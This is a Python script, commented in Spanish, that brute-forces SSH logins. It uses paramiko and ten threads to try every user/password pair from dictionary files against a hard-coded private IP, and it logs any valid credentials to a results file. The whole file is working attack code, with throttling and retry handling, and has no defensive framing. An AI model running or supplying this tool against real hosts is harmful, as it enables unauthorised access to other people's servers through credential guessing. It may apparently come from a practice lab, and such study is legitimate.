import paramiko
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
from tqdm import tqdm
import os
TARGET_IP = "192.168.194.131"
PORT = 22
TIMEOUT = 1.0
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

def read_file(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return[line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Error: No se encontró {path}")
        return []


def login_loop(users, passwords):
    max_hilos=10
    total_combinaciones = len(users) * len(passwords)
    barra = tqdm(total = total_combinaciones, desc="[+] Atacando SSH", unit="try")

    with ThreadPoolExecutor(max_workers=max_hilos) as executor:
        tareas_pendientes = {}
        
        for user in users:
            for password in passwords:
                future = executor.submit(try_ssh_login, user, password)
                tareas_pendientes[future] = (user, password)
                
                if len(tareas_pendientes) > max_hilos *2:
                    time.sleep(0.3)
        for future in as_completed(tareas_pendientes):
            barra.update(1)
            user, password = tareas_pendientes[future]
            
            try:
                exito = future.result() 
                if exito:
                    user, password = tareas_pendientes[future]
                    print(f"\n[!] COMBINACIÓN ENCONTRADA: {user}@{TARGET_IP}:{password}")
                    barra.close()
                    print(f"-"*40 + "ATAQUE FINALIZADO"+ "-"*40)
                    executor.shutdown(wait=False, cancel_futures=True)

                    return True
                
            except Exception as exc:
                print(f"[!] El hilo de {user} generó una excepción: {exc}")
    barra.close()
    return False


   
def try_ssh_login(user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    intentos_red = 0
    while intentos_red < 3:
        try:
            client.connect(
                TARGET_IP,
                port=PORT,
                username=user,
                password=password,
                timeout=TIMEOUT,
                banner_timeout=2.0,
                allow_agent=False,
                look_for_keys=False)
            print(f"[+] CREDENCIALES VÁLIDAS -> {user}:{password}")
            with open("./results/resultados_ssh.txt", "a", encoding="utf-8") as f:
                f.write(f"EXITO: {user}:{password} en {TARGET_IP}\n")
            return True
        except paramiko.AuthenticationException:
            return False
        except (paramiko.SSHException, socket.error):
            intentos_red += 1
            continue
        except socket.timeout:
            print("[!] Timeout — posible rate limit")
        except Exception as e:
            print(f"[!] Error: {e}")
        finally:
            client.close()
        return False

def main():
    ruta_resultados = "./results/resultados_ssh.txt"
    if os.path.exists(ruta_resultados):
        os.remove(ruta_resultados)
        print(f"[*] Archivo de resultados previo borrado.")
    
    os.makedirs("./results", exist_ok=True)
    users = read_file("./dictionary/user.txt")
    passwords = read_file("./dictionary/pass.txt")

    
    print(f"[+] Usuarios: {len(users)} | Passwords: {len(passwords)}")
    print("[*] Iniciando brute force SSH...\n")
    exito = login_loop(users, passwords)
    
    if not exito:
        print("\n[*] Ataque finalizado sin resultados.")
    
if __name__ == "__main__":
    main()